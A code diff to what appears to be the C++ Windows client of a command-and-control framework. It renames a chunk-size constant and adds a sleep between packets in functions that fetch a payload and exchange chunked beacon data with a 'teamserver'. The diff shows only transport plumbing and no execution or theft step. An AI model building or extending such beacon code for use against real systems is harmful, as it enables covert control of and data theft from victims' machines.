@@ -125,6 +125,9 @@ std::vector<uint8_t> sendChunk(
         //print_packet_hex(buffer, recvLen);
 
         response.assign(buffer, buffer + recvLen);
+
+
+
     }
     catch (...) {
         if (sock != INVALID_SOCKET) {
@@ -133,6 +136,9 @@ std::vector<uint8_t> sendChunk(
         WSACleanup();
         throw;
     }
+
+	//sleep. Sleeping here as everythign that clals this will be forced tos leep
+	Sleep(Client::packetSleepTimeMs);
 
     closesocket(sock);
     WSACleanup();
@@ -196,7 +202,7 @@ std::vector<uint8_t> getPayload(std::vector<uint8_t> clientId) {
         //add data to vector
         payloadBuffer.insert(payloadBuffer.end(), extensionData.begin(), extensionData.end());
 
-        std::cout << "Packet [" << counter << "/" << payloadSize / Chunk::maxChunkSize << "]" << std::endl;
+        std::cout << "Packet [" << counter << "/" << payloadSize / Client::maxChunkSize << "]" << std::endl;
         counter++;
     }
 
@@ -252,10 +258,10 @@ std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::
 	//1. Calculate size of data, (data.size()), then send a sizePacket to server. If OK, continue
 	uint32_t dataSize = data.size(); //uint64_t acn hold a size of like 18 Quadrillion bytes (18 exabytes). I hope someone isn't sending that much data but who knows. Rather be safe than sorry.
 	std::vector<uint8_t> responseDataBuffer = {};
-	int amountOfChunks = (dataSize + Chunk::maxChunkSize - 1) / Chunk::maxChunkSize; //gives you one extra chunk for remainder
+	int amountOfChunks = (dataSize + Client::maxChunkSize - 1) / Client::maxChunkSize; //gives you one extra chunk for remainder
 
 	std::cout << "[?] Total Data Size: " << dataSize << std::endl;
-	std::cout << "[?] Max Chunk Size: " << Chunk::maxChunkSize << std::endl;
+	std::cout << "[?] Max Chunk Size: " << Client::maxChunkSize << std::endl;
 	std::cout << "[?] Number of Chunks needed: " << amountOfChunks << std::endl;
 
 	/*
@@ -279,8 +285,8 @@ std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::
 	//now we start sending the actual data, with the dataForTeamserver
 	// Loop over each chunk index
 	for (int i = 0; i < amountOfChunks; ++i) { //++i as we want to get the last chunk
-		size_t start = i * Chunk::maxChunkSize; //get how far into the data we need to be to get the chunk
-		size_t end = std::min(start + Chunk::maxChunkSize, static_cast<size_t>(dataSize));
+		size_t start = i * Client::maxChunkSize; //get how far into the data we need to be to get the chunk
+		size_t end = std::min(start + Client::maxChunkSize, static_cast<size_t>(dataSize));
 
 		std::vector<uint8_t> chunkData(data.begin() + start, data.begin() + end);
 
@@ -365,10 +371,10 @@ std::vector<uint8_t> getBeaconDataFromTeamserver(std::vector<uint8_t> clientId) 
 	std::vector<uint8_t> responseSize = responseSizeClass.getExtensionData();
 	uint32_t dataSize = vectorToUint32(responseSize);
 	std::vector<uint8_t> responseDataBuffer = {};
-	int amountOfChunks = (dataSize + Chunk::maxChunkSize - 1) / Chunk::maxChunkSize; //gives you one extra chunk for remainder
+	int amountOfChunks = (dataSize + Client::maxChunkSize - 1) / Client::maxChunkSize; //gives you one extra chunk for remainder
 
 	std::cout << "[?] Total Data Size: " << dataSize << std::endl;
-	std::cout << "[?] Max Chunk Size: " << Chunk::maxChunkSize << std::endl;
+	std::cout << "[?] Max Chunk Size: " << Client::maxChunkSize << std::endl;
 	std::cout << "[?] Number of Chunks needed: " << amountOfChunks << std::endl;
 
 
@@ -376,8 +382,8 @@ std::vector<uint8_t> getBeaconDataFromTeamserver(std::vector<uint8_t> clientId) 
 	//now we start sending the actual data, with the dataForTeamserver
 	// Loop over each chunk index
 	for (int i = 0; i < amountOfChunks; ++i) { //++i as we want to get the last chunk
-		size_t start = i * Chunk::maxChunkSize; //get how far into the data we need to be to get the chunk
-		size_t end = std::min(start + Chunk::maxChunkSize, static_cast<size_t>(dataSize)); //gets the smaller of the 2, whether that be dataSize, or start+maxChunkSize. TLDR, prevents trying to read outside of func arg provided data buffer (which is only so big)
+		size_t start = i * Client::maxChunkSize; //get how far into the data we need to be to get the chunk
+		size_t end = std::min(start + Client::maxChunkSize, static_cast<size_t>(dataSize)); //gets the smaller of the 2, whether that be dataSize, or start+maxChunkSize. TLDR, prevents trying to read outside of func arg provided data buffer (which is only so big)
 
 		//Print that we're sending a packet, adn what type of packet it is.
 		std::cout << "----------------------" << std::endl;
